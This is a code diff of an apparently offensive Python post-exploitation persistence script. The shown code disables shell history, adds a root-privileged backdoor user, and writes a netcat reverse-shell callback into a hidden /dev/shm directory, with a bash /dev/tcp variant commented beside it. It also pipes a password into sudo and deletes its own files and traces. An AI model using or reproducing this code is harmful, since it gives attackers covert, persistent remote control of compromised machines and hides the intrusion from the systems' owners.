@@ -39,20 +39,21 @@ def disable_hist():
 
 
 # check for root permissions
-perms = os.system("whoami")
-print("perms = {}".format(perms))
+os.system("whoami | tee /tmp/whoami.txt")
 
-is_root = None
-def perm_check(perms, is_root):
-	if perms == "root":
-		return is_root = True
-	else:
-		return is_root = True
-		print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
+
+def perm_check():
+	with open("/tmp/whoami.txt") as who_file:
+		who = who_file.readlines()[-1].strip()
+		if who == "root":
+			return True
+		else:
+			print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
+			return False
 
 
 # call function to check for root permissions
-perm_check(perms, is_root)
+is_root = perm_check()
 
 
 # add user with root perms
@@ -71,14 +72,15 @@ def add_user(username,password):
 
 
 # create script for nc rev shell callback
-def callback(local_ip, local_port, username):
+def callback(local_ip, local_port, username, password):
 	try:
 		print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
 		os.system("mkdir /dev/shm/.data")
 		os.system("touch /dev/shm/.data/data-log.sh")
 		os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
+		os.system("chown {} /dev/shm/.data/".format(username))
+		os.system("echo {} | sudo su root1".format(password))
 		os.system("chmod 100 /dev/shm/.data/data-log.sh")
-		os.system("chown {}: /dev/shm/.data/".format(username))
 		os.system("chmod 700 /dev/shm/.data/")
 		print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
 		#os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
@@ -117,6 +119,7 @@ def clear_tracks():
 
 	print("\n### deleting data file and script... ###")
 	os.system("rm -rf /tmp/.backups")
+	os.system("rm -f /tmp/whoami.txt")
 	os.system("rm -f pers.py")
 
 
@@ -124,6 +127,7 @@ def clear_tracks():
 if is_root or args.force:
 	disable_hist()
 	add_user(username, password)
-	callback(local_ip, local_port, username)
+	callback(local_ip, local_port, username, password)
 	cron_make()
 	clear_tracks()
+	
